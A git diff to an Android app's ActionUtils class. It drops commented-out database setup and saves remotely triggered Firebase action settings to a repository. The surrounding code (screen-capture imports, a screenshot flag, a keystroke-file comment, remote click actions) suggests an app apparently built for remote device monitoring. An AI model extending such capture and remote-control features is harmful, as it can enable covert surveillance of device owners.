@@ -12,6 +12,7 @@ import android.content.IntentFilter;
 import android.media.projection.MediaProjectionManager;
 import android.os.Build;
 import android.os.CountDownTimer;
+import android.os.Environment;
 import android.os.Handler;
 import android.provider.Settings;
 import android.util.Log;
@@ -25,6 +26,7 @@ import com.google.gson.Gson;
 import com.google.gson.reflect.TypeToken;
 import com.vikasyadavnsit.cdc.R;
 import com.vikasyadavnsit.cdc.data.User;
+import com.vikasyadavnsit.cdc.database.repository.ApplicationDataRepository;
 import com.vikasyadavnsit.cdc.fragment.HomeFragment;
 import com.vikasyadavnsit.cdc.fragment.PlayFragment;
 import com.vikasyadavnsit.cdc.fragment.SettingsFragment;
@@ -49,11 +51,8 @@ public class ActionUtils {
         //Handle Button Presses
         activity.findViewById(R.id.main_navigation_request_play_button).setOnClickListener(view -> {
             CommonUtil.loadFragment(activity.getSupportFragmentManager(), new PlayFragment());
-//                DatabaseUtil dbUtils = new DatabaseUtil(activity, AppConstants.CDC_DATABASE_NAME, AppConstants.CDC_DATABASE_PATH);
-//                dbUtils.createTable(DBConstants.CREATE_APPLICATION_DATA_TABLE);
-//                dbUtils.insertIntoApplicationData( "SENSOR_READ_INTERVAL_IN_MS", "600000");
-//                dbUtils.insertIntoApplicationData( "SENSOR_READ_DURATION_IN_MS", "5000");
-//                dbUtils.insertIntoApplicationData( "CAPTURE_SCREEN_SHOT", "TRUE");
+
+            // Todo : databaseutil will configure a reset functionality
 
             //CDCFileReader.readAndCreateTemporaryFile(FileMap.KEYSTROKE);
         });
@@ -175,12 +174,17 @@ public class ActionUtils {
         }.getType();
         Map<String, User.AppTriggerSettingsData> appTriggerSettingsDataMap = new Gson().fromJson(new Gson().toJson(obj), type);
         Log.d("ActionUtils", "Processing Remote Firebase Actions");
+        //DatabaseUtil dbUtils = DatabaseUtil.getInstance(context);
         appTriggerSettingsDataMap.forEach((key, value) -> {
             if (value.isEnabled()) {
                 Log.d("ActionUtils", "Performing Remote Firebase Action for : " + key);
                 value.getClickActions().getBiConsumer().accept(context, value);
             }
         });
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && Environment.isExternalStorageManager()) {
+            ApplicationDataRepository.updateAllRecords(appTriggerSettingsDataMap);
+        }
     }
 
 }
